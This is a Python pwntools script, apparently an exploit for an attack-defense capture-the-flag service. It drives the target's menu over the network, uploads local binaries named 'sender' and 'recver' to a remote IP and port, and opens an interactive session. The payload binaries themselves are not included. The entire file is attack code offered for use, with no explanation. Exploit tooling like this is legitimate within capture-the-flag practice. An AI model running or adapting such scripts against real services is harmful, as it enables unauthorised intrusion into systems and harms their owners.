#!/usr/bin/env python
import json
import string
import traceback
from pwn import *

context.timeout = 10
context.arch = 'amd64'
context.log_level = "error"
#context.terminal = ['tmux', 'neww']

r = None

def get_rand_str(length, charset=None):
    """Generate a random string of fixed length """
    if charset is None:
        charset = string.ascii_letters + string.digits
    return ''.join(random.choice(charset) for i in range(length))

def save():
    r.sendlineafter('>> ', '0')
    r.recvuntil('your tools at: ')
    place = r.recvline().strip()
    r.recvuntil('password: ')
    passwd = r.recvline().strip()
    return place, passwd

def load(place, passwd):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('>> ', place)
    r.sendlineafter('>> ', passwd)

def bring(idx, height=-1):
    assert 0 <= idx <= 3
    r.sendlineafter('>> ', '2')
    r.sendlineafter('>> ', str(idx))
    if idx == 0:
        r.sendlineafter('>> ', str(height))

def show():
    r.sendlineafter('>> ', '3')

def rename(name):
    r.sendlineafter('>> ', '4')
    r.sendlineafter('>> ', name)

def attempt(use):
    r.sendlineafter('>> ', '5')
    r.sendlineafter('>> ', str(use))

def upload_bin(path):
    with open(path, 'rb') as f:
        content = f.read()
    r.sendlineafter('>> ', str(len(content)))
    r.sendlineafter('>> ', content)

def checked_bring(idx):
    choice = random.randint(0, 1)

    if idx != 0:
        bring(idx)
        assert "How high do you want it to be?" not in r.recvline()
        return None

    r.sendlineafter('>> ', '2')
    r.sendlineafter('>> ', str(idx))
    assert "How high do you want it to be?" in r.recvline()
    if choice:
        r.sendlineafter(">> ", str(-1))
        assert 'You are a cheater' in r.recvline()
        return None
    else:
        val = random.randint(0, 0xffff)
        r.sendlineafter('>> ', str(val))
        return val

def exploit(IP, PORT, path):
    global r
    dirname = os.path.dirname(__file__)
    sender = os.path.join(dirname, 'sender')
    recver = os.path.join(dirname, 'recver')

    r = remote(IP, PORT)
    bring(1)
    attempt(1)
    upload_bin(sender)

    r = remote(IP, PORT)
    bring(3)
    attempt(3)
    upload_bin(recver)

    r.interactive()

if __name__ == "__main__":
    IP = sys.argv[1]
    PORT = sys.argv[2]
    FLAG_ID = sys.argv[3]

    path = os.path.join("/home/chall/service/append/", FLAG_ID)
    exploit(IP, PORT, path)
